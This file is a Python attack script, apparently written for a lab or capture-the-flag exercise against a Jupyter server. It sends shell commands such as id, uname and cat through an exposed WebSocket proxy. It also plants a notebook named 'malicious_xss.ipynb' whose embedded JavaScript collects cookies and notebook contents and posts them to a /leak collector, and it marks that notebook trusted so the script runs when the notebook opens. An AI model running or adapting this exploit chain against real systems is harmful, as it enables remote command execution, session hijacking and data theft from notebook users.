#!/usr/bin/env python3
import argparse
import asyncio
import json

import httpx
import websockets

# notebook payloads
TRUST_TARGET = "/app/lab_notebooks/malicious_xss.ipynb"

notebook = {
    "cells": [
        {
            "cell_type": "code",
            "id": "cfcc2012",
            "execution_count": None,
            "metadata": {},
            "outputs": [],
            "source": [
                "from IPython.display import HTML\n",
                "HTML(\"\"\"\n",
                "<h1>Injected content</h1>\n",
                "<p>This markdown renders inline HTML and JavaScript.</p>\n",
                "<script>\n",
                "(async () => {\n",
                "  try {\n",
                "    const contentsResp = await fetch('/api/contents?content=1');\n",
                "    const data = await contentsResp.json();\n",
                "    const target = 'http://localhost:8080/leak';\n",
                "    await fetch(target, {\n",
                "      method: 'POST',\n",
                "      headers: { 'Content-Type': 'application/json' },\n",
                "      body: JSON.stringify({\n",
                "        location: window.location.href,\n",
                "        cookies: document.cookie,\n",
                "        contents: data\n",
                "      })\n",
                "    });\n",
                "    console.log('exfil sent to', target);\n",
                "  } catch (err) {\n",
                "    console.error('exfil failed', err);\n",
                "  }\n",
                "})();\n",
                "</script>\n",
                "<div style=\\\"padding:8px;border:1px solid #f00;\\\" onclick=\\\"alert('onclick trigger fired')\\\">Click me</div>\n",
                "\"\"\")\n",
            ],
        }
    ],
    "metadata": {
        "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
        "language_info": {"name": "python"},
    },
    "nbformat": 4,
    "nbformat_minor": 5,
}

TABLE_NOTEBOOK = {
    "cells": [
        {
            "cell_type": "markdown",
            "id": "demo-table",
            "metadata": {},
            "source": [
                "# Demo Table\n",
                "\n",
                "Below is a simple table rendered from Markdown:\n",
                "\n",
                "| Name   | Team   | Score |\n",
                "| :----- | :----: | ----: |\n",
                "| Alice  | Red    | 42    |\n",
                "| Bob    | Blue   | 37    |\n",
                "| Carol  | Green  | 45    |\n",
            ],
        }
    ],
    "metadata": {
        "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
        "language_info": {"name": "python"},
    },
    "nbformat": 4,
    "nbformat_minor": 5,
}

NOTEBOOK_CMD = (
    "python - <<'EOF'\n"
    "import json, pathlib\n"
    f"nb = json.loads(r'''{json.dumps(notebook)}''')\n"
    "p = pathlib.Path('/app/lab_notebooks/malicious_xss.ipynb')\n"
    "p.parent.mkdir(parents=True, exist_ok=True)\n"
    "p.write_text(json.dumps(nb, indent=2))\n"
    "print(f'Wrote {p}')\n"
    "EOF"
)

TABLE_NOTEBOOK_CMD = (
    "python - <<'EOF'\n"
    "import json, pathlib\n"
    f"nb = json.loads(r'''{json.dumps(TABLE_NOTEBOOK)}''')\n"
    "p = pathlib.Path('/app/lab_notebooks/demo_table.ipynb')\n"
    "p.parent.mkdir(parents=True, exist_ok=True)\n"
    "p.write_text(json.dumps(nb, indent=2))\n"
    "print(f'Wrote {p}')\n"
    "EOF"
)

DEFAULT_COMMANDS = [
    NOTEBOOK_CMD,
    TABLE_NOTEBOOK_CMD,
    "id",
    "uname -a",
    "pwd",
    "ls",
    "ls /app/lab_notebooks",
    "cat /app/lab_notebooks/safe_demo.ipynb",
    "cat /app/lab_notebooks/demo_table.ipynb",
    f"jupyter trust {TRUST_TARGET}",
]

parser = argparse.ArgumentParser(description="Quick and dirty WebSocket recon.")
parser.add_argument("--base-url", default="http://localhost:8888")
parser.add_argument("--token")
parser.add_argument("-c", "--command", dest="commands", action="append")
parser.add_argument("--timeout", type=float, default=10.0)
args = parser.parse_args()

commands = args.commands or DEFAULT_COMMANDS
base = args.base_url.rstrip("/")
hi_url = f"{base}/proxy/9000/hi"
ws_url = f"{base}/proxy/9000/ws"
if base.startswith("https"):
    ws_url = ws_url.replace("https://", "wss://", 1)
else:
    ws_url = ws_url.replace("http://", "ws://", 1)
if args.token:
    sep_hi = "&" if "?" in hi_url else "?"
    sep_ws = "&" if "?" in ws_url else "?"
    hi_url = f"{hi_url}{sep_hi}token={args.token}"
    ws_url = f"{ws_url}{sep_ws}token={args.token}"


async def main():
    async with httpx.AsyncClient(timeout=args.timeout, follow_redirects=True) as client:
        resp = await client.get(hi_url)
        print(f"[http] {hi_url} -> {resp.status_code}")
        print(resp.text[:400])

    async with websockets.connect(ws_url, open_timeout=args.timeout) as ws:
        for command in commands:
            print(f"\n[ws] -> {command}")
            await ws.send(command)
            message = await ws.recv()
            print(message)
            payload = json.loads(message)
            if isinstance(payload, dict):
                stdout = (payload.get("stdout") or "").strip()
                stderr = (payload.get("stderr") or "").strip()
                if stdout:
                    print(stdout)
                if stderr:
                    print(stderr)


if __name__ == "__main__":
    asyncio.run(main())
